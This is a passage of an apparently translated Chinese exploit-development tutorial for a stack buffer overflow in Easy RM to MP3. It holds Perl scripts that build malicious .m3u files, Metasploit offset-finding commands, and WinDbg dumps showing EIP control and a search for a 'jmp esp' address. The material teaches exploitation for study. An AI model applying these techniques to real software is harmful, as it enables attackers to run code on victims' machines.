42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB</span><br><span class="line">000ff750  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB</span><br><span class="line">000ff760  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB</span><br><span class="line">000ff770  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB</span><br><span class="line">000ff780  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB</span><br><span class="line">000ff790  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB</span><br><span class="line">000ff7a0  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB</span><br><span class="line">0:000&gt; d</span><br><span class="line">000ff7b0  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB</span><br><span class="line">000ff7c0  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB</span><br><span class="line">000ff7d0  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB</span><br><span class="line">000ff7e0  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB</span><br><span class="line">000ff7f0  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB</span><br><span class="line">000ff800  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB</span><br><span class="line">000ff810  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB</span><br><span class="line">000ff820  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB</span><br><span class="line">0:000&gt; d</span><br><span class="line">000ff830  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB</span><br><span class="line">000ff840  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB</span><br><span class="line">000ff850  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB</span><br><span class="line">000ff860  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB</span><br><span class="line">000ff870  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB</span><br><span class="line">000ff880  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB</span><br><span class="line">000ff890  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB</span><br><span class="line">000ff8a0  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这是一个好消息，我们已经用 BBBB 覆盖了 EIP，我们还可以在 ESP 中看到我们的缓存区。</p>
<p>&emsp;&emsp;在开始调整脚本之前，我们需要找到覆盖 EIP 的缓冲区中的确切位置。</p>
<p>&emsp;&emsp;为了找到确切的位置，我们将使用 Metasploit。</p>
<p>&emsp;&emsp;Metasploit 有一个很好的工具帮助我们计算偏移。它将生产一个包含唯一格式的字符串。使用这个格式（以及在恶意的 .m3u文件中使用该格式后 EIP 的值），我们可以看到准确写入 EIP 的缓冲区有多大。</p>
<p>&emsp;&emsp;打开 Metasploit framework3 文件夹中的 tools 文件夹（我使用的是 metasploit 3 的 linux 版本），应该会找到一个名为 pattern_create.rb 的工具。创建一个的 5000个的格式字符并将其写入文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@bt:/pentest/exploits/framework3/tools# ./pattern_create.rb</span><br><span class="line">Usage: pattern_create.rb length [set a] [set b] [set c]</span><br><span class="line">root@bt:/pentest/exploits/framework3/tools# ./pattern_create.rb 5000</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;编辑 perl 脚本 并且使用我们的 5000个字符替换 $junk2 的内容。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">my</span> $file= <span class="string">"crash25000.m3u"</span>;</span><br><span class="line"><span class="keyword">my</span> $junk = <span class="string">"\x41"</span> <span class="keyword">x</span> <span class="number">25000</span>;</span><br><span class="line"><span class="keyword">my</span> $junk2 = “put the <span class="number">5000</span> characters here”</span><br><span class="line"><span class="keyword">open</span>($FILE,<span class="string">"&gt;$file"</span>);</span><br><span class="line"><span class="keyword">print</span> $FILE $junk.$junk2;</span><br><span class="line"><span class="keyword">close</span>($FILE);</span><br><span class="line"><span class="keyword">print</span> <span class="string">"m3u File Created successfully\n"</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;创建 m3u文件。在 Easy RM to MP3中打开此文件，等待程序再次死亡，并注意 EIP 的内容。</p>
<figure class="image-box">
                <img src="https://www.corelan.be/wp-content/uploads/2009/08/image_thumb3.png" alt="image" title class>
                <p>image</p>
            </figure>



<p>&emsp;&emsp;此时，EIP 包含 0x356b4234（注意：从小到大：我们使用 34 42 6b 35 = 4Bk5 覆盖了 EIP）</p>
<p>&emsp;&emsp;现在让我们使用第二个 Metasploit 工具，再计算在写入 EIp之前缓冲区确切的长度，输入 EIP 的值（基于格式文件）和缓冲区的长度：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@bt:/pentest/exploits/framework3/tools# ./pattern_offset.rb 0x356b4234 5000</span><br><span class="line">1094</span><br><span class="line">root@bt:/pentest/exploits/framework3/tools#</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;1094。这就是覆盖 EIP 所需的缓冲区长度。因此，如果你创建一个文件，其中包含 25000+1094个A，然后添加 4个B（十六进制为 42 42 42 42），EIP 应该包含 42 42 42 42。我们需要知道 ESP 指向缓冲区中的数据，所以我们将在覆盖 EIP 之后添加一些 C。</p>
<p>让我们试一试。修改 perl 脚本以创建新的 m3u文件。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">my</span> $file= <span class="string">"eipcrash.m3u"</span>;</span><br><span class="line"><span class="keyword">my</span> $junk= <span class="string">"A"</span> <span class="keyword">x</span> <span class="number">26094</span>;</span><br><span class="line"><span class="keyword">my</span> $eip = <span class="string">"BBBB"</span>;</span><br><span class="line"><span class="keyword">my</span> $espdata = <span class="string">"C"</span> <span class="keyword">x</span> <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">open</span>($FILE,<span class="string">"&gt;$file"</span>);</span><br><span class="line"><span class="keyword">print</span> $FILE $junk.$eip.$espdata;</span><br><span class="line"><span class="keyword">close</span>($FILE);</span><br><span class="line"><span class="keyword">print</span> <span class="string">"m3u File Created successfully\n"</span>;</span><br></pre></td></tr></table></figure>

<p>创建 eipcrash.m3u，使用 Easy RM to MP3 打开它，观察崩溃之后 EIP 和 在 ESP 内存的内容：</p>
<figure class="image-box">
                <img src="https://www.corelan.be/wp-content/uploads/2009/07/image70_thumb.png" alt="image" title class>
                <p>image</p>
            </figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; d esp</span><br><span class="line">000ff730  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC</span><br><span class="line">000ff740  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC</span><br><span class="line">000ff750  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC</span><br><span class="line">000ff760  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC</span><br><span class="line">000ff770  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC</span><br><span class="line">000ff780  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC</span><br><span class="line">000ff790  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC</span><br><span class="line">000ff7a0  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC</span><br></pre></td></tr></table></figure>

<p>在 Immunity Debugger 中，你可以通过查看右下角的窗口，查看 ESP 在栈中的内容。</p>
<p>太好了，EIP 包含 BBBB，这正是我们想要的。现在我们控制了 EIP，除此之外，ESP 指向我们的缓冲区（C）。</p>
<blockquote>
<p>注意：这里显示的偏移量是在我自己的系统上分析的结果。如果你试图在自己的系统上重现本教程中的练习，则很有可能得到不同的偏移地址。因此，请不要只获取偏移量值或将源代码复制到系统中，因为偏移量是基于存储 m3u文件的路径。易溢出的缓冲区包含了 m3u文件的完整路径，所以如果你的系统上的路径比我的短或长，那么偏移量就会不同。</p>
</blockquote>
<p>我们的缓冲区 exploit  目前看起来是这样的：</p>
<table>
<thead>
<tr>
<th>Buffer</th>
<th>EBP</th>
<th>EIP</th>
<th>ESP points here|V</th>
</tr>
</thead>
<tbody><tr>
<td>A (x 26090)</td>
<td>AAAA</td>
<td>BBBB</td>
<td>CCCCCCCCCCCCCCCCCCCCCCCC</td>
</tr>
<tr>
<td>414141414141…41</td>
<td>41414141</td>
<td>42424242</td>
<td></td>
</tr>
<tr>
<td>26090 bytes</td>
<td>4 bytes</td>
<td>4 bytes</td>
<td>1000 bytes ?</td>
</tr>
</tbody></table>
<hr>
<h3 id="找到内存空间来托管-shellcode"><a href="#找到内存空间来托管-shellcode" class="headerlink" title="找到内存空间来托管 shellcode"></a>找到内存空间来托管 shellcode</h3><p>&emsp;&emsp;我们控制了 EIP，所以我们可以让 EIP 指向其他地方，比如存放我们自己的代码（shellcode）的地方。但是那个地方是哪里，我们怎样才能将 shellcode 放到那个位置并且我们怎样让 EIP 跳转到那个位置？</p>
<p>&emsp;&emsp;为了让这个程序崩溃，我们已经写入了 26094个 A 到内存，并且写入了新的值到 EIP 区域内（ret），并且写入了一串 C。</p>
<p>&emsp;&emsp;当程序崩溃，看一下寄存器并且将它们全部导出（d esp，d eax，d ebx，d ebp，等等）。如果你看到你的 buffer（那些 A 或者 那些 C）在某个寄存器，然后可能你可以将他们替换为 shellcode 并且跳转到那个位置。在我们的例子中，我们可以看到似乎 ESP 指向我们的那些 C（记住上面 esp 的输出），所以理想地我们可以用我们的 shellcode 去替换那些 C 并且我们告诉 EIP 跳转到 ESP 的地址。</p>
<p>&emsp;&emsp;尽管我们的确可以看到那些 C，但是我们不确定第一个 C（ESP指向的 000ff730地址）是我们输入到 buffer 中的第一个 C。</p>
<p>&emsp;&emsp;我们将改变 perl 脚本并且输入一段格式字符（我使用了144个字符，但是你可以多于或少于它）替换那些 C：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">my</span> $file= <span class="string">"test1.m3u"</span>;</span><br><span class="line"><span class="keyword">my</span> $junk= <span class="string">"A"</span> <span class="keyword">x</span> <span class="number">26094</span>;</span><br><span class="line"><span class="keyword">my</span> $eip = <span class="string">"BBBB"</span>;</span><br><span class="line"><span class="keyword">my</span> $shellcode = <span class="string">"1ABCDEFGHIJK2ABCDEFGHIJK3ABCDEFGHIJK4ABCDEFGHIJK"</span> .</span><br><span class="line"><span class="string">"5ABCDEFGHIJK6ABCDEFGHIJK"</span> .</span><br><span class="line"><span class="string">"7ABCDEFGHIJK8ABCDEFGHIJK"</span> .</span><br><span class="line"><span class="string">"9ABCDEFGHIJKAABCDEFGHIJK"</span>.</span><br><span class="line"><span class="string">"BABCDEFGHIJKCABCDEFGHIJK"</span>;</span><br><span class="line"><span class="keyword">open</span>($FILE,<span class="string">"&gt;$file"</span>);</span><br><span class="line"><span class="keyword">print</span> $FILE $junk.$eip.$shellcode;</span><br><span class="line"><span class="keyword">close</span>($FILE);</span><br><span class="line"><span class="keyword">print</span> <span class="string">"m3u File Created successfully\n"</span>;</span><br></pre></td></tr></table></figure>

<p>创建这个文件，打开它，让程序崩溃并且导出 ESP 的所有内存：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; d esp</span><br><span class="line">000ff730  44 45 46 47 48 49 4a 4b-32 41 42 43 44 45 46 47  DEFGHIJK2ABCDEFG</span><br><span class="line">000ff740  48 49 4a 4b 33 41 42 43-44 45 46 47 48 49 4a 4b  HIJK3ABCDEFGHIJK</span><br><span class="line">000ff750  34 41 42 43 44 45 46 47-48 49 4a 4b 35 41 42 43  4ABCDEFGHIJK5ABC</span><br><span class="line">000ff760  44 45 46 47 48 49 4a 4b-36 41 42 43 44 45 46 47  DEFGHIJK6ABCDEFG</span><br><span class="line">000ff770  48 49 4a 4b 37 41 42 43-44 45 46 47 48 49 4a 4b  HIJK7ABCDEFGHIJK</span><br><span class="line">000ff780  38 41 42 43 44 45 46 47-48 49 4a 4b 39 41 42 43  8ABCDEFGHIJK9ABC</span><br><span class="line">000ff790  44 45 46 47 48 49 4a 4b-41 41 42 43 44 45 46 47  DEFGHIJKAABCDEFG</span><br><span class="line">000ff7a0  48 49 4a 4b 42 41 42 43-44 45 46 47 48 49 4a 4b  HIJKBABCDEFGHIJK</span><br><span class="line">0:000&gt; d</span><br><span class="line">000ff7b0  43 41 42 43 44 45 46 47-48 49 4a 4b 00 41 41 41  CABCDEFGHIJK.AAA</span><br><span class="line">000ff7c0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class="line">000ff7d0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class="line">000ff7e0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class="line">000ff7f0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class="line">000ff800  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class="line">000ff810  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class="line">000ff820  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;好的，我们可以在这里看到两件有趣的事情：</p>
<ul>
<li>ESP 开始于我们的第五个格式字符，并且不是第一个字符。你可以通过论坛帖子找到：/index.php/forum/writing-exploits/question-about-esp-in-tutorial-pt1</li>
<li>在格式字符之后，我们看到了一些 A。那些 A 看起来属于 buffer（26101个A）的第一部分，所以我们应该也可以将我们的 shellcode 放至 buffer 的第一部分（在覆盖 RET 之前）</li>
</ul>
<p>&emsp;&emsp;但是我们先不那样做。我们首先将在 pattern 中添加 4个格式字符然后再做一次测试。如果一切正常，ESP 现在应该直接指向我们的格式的开头。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">my</span> $file= <span class="string">"test1.m3u"</span>;</span><br><span class="line"><span class="keyword">my</span> $junk= <span class="string">"A"</span> <span class="keyword">x</span> <span class="number">26094</span>;</span><br><span class="line"><span class="keyword">my</span> $eip = <span class="string">"BBBB"</span>;</span><br><span class="line"><span class="keyword">my</span> $preshellcode = <span class="string">"XXXX"</span>;</span><br><span class="line"><span class="keyword">my</span> $shellcode = <span class="string">"1ABCDEFGHIJK2ABCDEFGHIJK3ABCDEFGHIJK4ABCDEFGHIJK"</span> .</span><br><span class="line"><span class="string">"5ABCDEFGHIJK6ABCDEFGHIJK"</span> .</span><br><span class="line"><span class="string">"7ABCDEFGHIJK8ABCDEFGHIJK"</span> .</span><br><span class="line"><span class="string">"9ABCDEFGHIJKAABCDEFGHIJK"</span>.</span><br><span class="line"><span class="string">"BABCDEFGHIJKCABCDEFGHIJK"</span>;</span><br><span class="line"><span class="keyword">open</span>($FILE,<span class="string">"&gt;$file"</span>);</span><br><span class="line"><span class="keyword">print</span> $FILE $junk.$eip.$preshellcode.$shellcode;</span><br><span class="line"><span class="keyword">close</span>($FILE);</span><br><span class="line"><span class="keyword">print</span> <span class="string">"m3u File Created successfully\n"</span>;</span><br></pre></td></tr></table></figure>

<p>让程序崩溃然后再次看 ESP</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; d esp</span><br><span class="line">000ff730  31 41 42 43 44 45 46 47-48 49 4a 4b 32 41 42 43  1ABCDEFGHIJK2ABC</span><br><span class="line">000ff740  44 45 46 47 48 49 4a 4b-33 41 42 43 44 45 46 47  DEFGHIJK3ABCDEFG</span><br><span class="line">000ff750  48 49 4a 4b 34 41 42 43-44 45 46 47 48 49 4a 4b  HIJK4ABCDEFGHIJK</span><br><span class="line">000ff760  35 41 42 43 44 45 46 47-48 49 4a 4b 36 41 42 43  5ABCDEFGHIJK6ABC</span><br><span class="line">000ff770  44 45 46 47 48 49 4a 4b-37 41 42 43 44 45 46 47  DEFGHIJK7ABCDEFG</span><br><span class="line">000ff780  48 49 4a 4b 38 41 42 43-44 45 46 47 48 49 4a 4b  HIJK8ABCDEFGHIJK</span><br><span class="line">000ff790  39 41 42 43 44 45 46 47-48 49 4a 4b 41 41 42 43  9ABCDEFGHIJKAABC</span><br><span class="line">000ff7a0  44 45 46 47 48 49 4a 4b-42 41 42 43 44 45 46 47  DEFGHIJKBABCDEFG</span><br><span class="line">0:000&gt; d</span><br><span class="line">000ff7b0  48 49 4a 4b 43 41 42 43-44 45 46 47 48 49 4a 4b  HIJKCABCDEFGHIJK</span><br><span class="line">000ff7c0  00 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  .AAAAAAAAAAAAAAA</span><br><span class="line">000ff7d0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class="line">000ff7e0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class="line">000ff7f0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class="line">000ff800  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class="line">000ff810  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class="line">000ff820  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;很好！</p>
<p>&emsp;&emsp;我们现在有：</p>
<ul>
<li>控制了 EIP</li>
<li>一个我们可以写入自己的代码的地方（至少是 144字节。如果你使用更长的格式做更多的测试，你会发现你有更多的空间）</li>
<li>一个在地址 0x000ff730 直接指向我们的代码的寄存器</li>
</ul>
<p>&emsp;&emsp;现在我们需要做的是：</p>
<ul>
<li>构造一段真正的 shellcode</li>
<li>告诉  EIP 跳转到 我们的 shellcode 开始的地址，我们可以通过使用地址 0x000ff730地址覆盖 EIP 达到此目的</li>
</ul>
<p>&emsp;&emsp;接着看</p>
<p>&emsp;&emsp;我们将构造一个小的测试例子：首先 26094个A，然后是使用 000ff730覆盖 EIP，然后25个 NOP，然后一个暂停，然后更多的 NOP。</p>
<p>&emsp;&emsp;如果一切正常，EIP 应该跳转到 000ff730，并且包含一些NOP。这个代码应该持续到那个暂停。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">my</span> $file= <span class="string">"test1.m3u"</span>;</span><br><span class="line"><span class="keyword">my</span> $junk= <span class="string">"A"</span> <span class="keyword">x</span> <span class="number">26094</span>;</span><br><span class="line"><span class="keyword">my</span> $eip = <span class="keyword">pack</span>(<span class="string">'V'</span>,<span class="number">0x000ff730</span>);  </span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $shellcode = <span class="string">"\x90"</span> <span class="keyword">x</span> <span class="number">25</span>; </span><br><span class="line"></span><br><span class="line">$shellcode = $shellcode.<span class="string">"\xcc"</span>;</span><br><span class="line">$shellcode = $shellcode.<span class="string">"\x90"</span> <span class="keyword">x</span> <span class="number">25</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">open</span>($FILE,<span class="string">"&gt;$file"</span>);</span><br><span class="line"><span class="keyword">print</span> $FILE $junk.$eip.$shellcode;</span><br><span class="line"><span class="keyword">close</span>($FILE);</span><br><span class="line"><span class="keyword">print</span> <span class="string">"m3u File Created successfully\n"</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;程序崩溃了，但是我们希望是一个暂停而不是违反访问。</p>
<p>&emsp;&emsp;当我们观察 EIP 的时候，它指向 000ff730，ESP也是这样。</p>
<p>&emsp;&emsp;当我们导出 ESP，我们没有看到我们期望看到的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">eax=00000001 ebx=00104a58 ecx=7c91005d edx=00000040 esi=77c5fce0 edi=0000662c</span><br><span class="line">eip=000ff730 esp=000ff730 ebp=003440c0 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">Missing image name, possible paged-out or corrupt data.</span><br><span class="line">Missing image name, possible paged-out or corrupt data.</span><br><span class="line">Missing image name, possible paged-out or corrupt data.</span><br><span class="line">+0xff71f:</span><br><span class="line">000ff730 0000            add     byte ptr [eax],al          ds:0023:00000001=??</span><br><span class="line">0:000&gt; d esp</span><br><span class="line">000ff730  00 00 00 00 06 00 00 00-58 4a 10 00 01 00 00 00  ........XJ......</span><br><span class="line">000ff740  30 f7 0f 00 00 00 00 00-41 41 41 41 41 41 41 41  0.......AAAAAAAA</span><br><span class="line">000ff750  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class="line">000ff760  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class="line">000ff770  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class="line">000ff780  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class="line">000ff790  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class="line">000ff7a0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;所以直接跳转到一个内存地址可能不是一个好的方法（毕竟 000ff730 包含一个空字符，它是一个终止符，所以你看到的 A 来自 buffer 的第一部分，我们从未到达在覆盖 EIP 之后开始编写数据的地方。而且，在 exploit 中使用一个内存地址去跳转会让这个 exploit 变得不稳定。毕竟这个内存地址在其他操作系统、语言等中应该不同）</p>
<p>&emsp;&emsp;长话短说：我们不能只是使用一个像 000ff730的直接的内存地址去覆盖 EIP。它不是一个好的主意，因为它不稳定，并且因为它包含一个空字节。我们必须使用另一个方法去达到相同的目的：让程序跳转到我们提供的代码。理想化地，我们应该能够引用一个寄存器（或者便宜至寄存器），在我们的例子中是 ESP，并且找到一个将跳转至寄存器的函数。然后我们将尝试使用这个函数的地址去覆盖 EIP 。</p>
<hr>
<h3 id="使用稳定的方式跳转至-shellcode"><a href="#使用稳定的方式跳转至-shellcode" class="headerlink" title="使用稳定的方式跳转至 shellcode"></a>使用稳定的方式跳转至 shellcode</h3><p>&emsp;&emsp;我们已经成功让 ESP 确切的指向了我们的 shellcode（或者，如果你以不同的角度去看待它，ESP 直接指向我们的 shellcode 的开头）。如果不是这样的。我们将查看其他的寄存器的内容，希望找到我们的 buffer 返回。不管怎样，在这个练习例子中，我们可以使用 ESP。</p>
<p>&emsp;&emsp;使用 ESP 的地址去覆盖 EIP的推论结果是我们想持续跳转到 ESP 并且执行 shellcode。</p>
<p>&emsp;&emsp;在 Windows 程序中跳转到 ESP 是一件很平常的事。事实上，Windows 程序使用一个或多个 dll，并且这些 dll 包含了大量指令。此外，这些 dll 使用的地址是完全静止的。所以如果我们发现一个带有跳转至 esp 的指令的 dll，并且如果我们可以使用这个dll 的指令的地址去覆盖 EIP，那么它应该会起作用，对吗？</p>
<p>&emsp;&emsp;接着看。首先，我们需要计算出 “jmp esp” 的操作码是多少。</p>
<p>&emsp;&emsp;我们可以通过启动 Easy RM to MP3，然后打开 windbg 然后将 windbg 与 Easy RM to MP3 程序连接得出结果。（只是连接至进程，不需要对 Easy RM to MP3 做任何操作。），这将会给我们可以看到所有被加载至这个程序的 dll’s/modules。（这是我提及的为什么它将变得清楚）</p>
<figure class="image-box">
                <img src="https://www.corelan.be/wp-content/uploads/2009/07/image_thumb17.png" alt="image" title class>
                <p>image</p>
            </figure>

<p>&emsp;&emsp;在将调试器附加到进程的时候，程序将会中断。</p>
<p>&emsp;&emsp;在 windbg 命令行中，在屏幕的底端，输入 a(集合)然后按下回车</p>
<p>&emsp;&emsp;现在输入 jmp esp 然后按下回车</p>
<figure class="image-box">
                <img src="https://www.corelan.be/wp-content/uploads/2009/07/image_thumb18.png" alt="image" title class>
                <p>image</p>
            </figure>



<p>&emsp;&emsp;再次按下回车。</p>
<p>&emsp;&emsp;现在输入 u（拆开）然后输入之前输入 jmp esp 后显示的地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0:014&gt; u 7c90120e</span><br><span class="line">ntdll!DbgBreakPoint:</span><br><span class="line">7c90120e ffe4            jmp     esp</span><br><span class="line">7c901210 8bff            mov     edi,edi</span><br><span class="line">ntdll!DbgUserBreakPoint:</span><br><span class="line">7c901212 cc              int     3</span><br><span class="line">7c901213 c3              ret</span><br><span class="line">7c901214 8bff            mov     edi,edi</span><br><span class="line">7c901216 8b442404        mov     eax,dword ptr [esp+4]</span><br><span class="line">7c90121a cc              int     3</span><br><span class="line">7c90121b c20400          ret     4</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;7c90120e 的旁边，你可以看到 ffe4。这是 jmp esp 的操作码</p>
<p>&emsp;&emsp;现在我们需要找到哪个 dll 加载了这个操作码。</p>
<p>&emsp;&emsp;注意 windbg 窗口的顶部，然后观察每行看哪个 dll 属于 Easy RM to MP3 程序：</p>
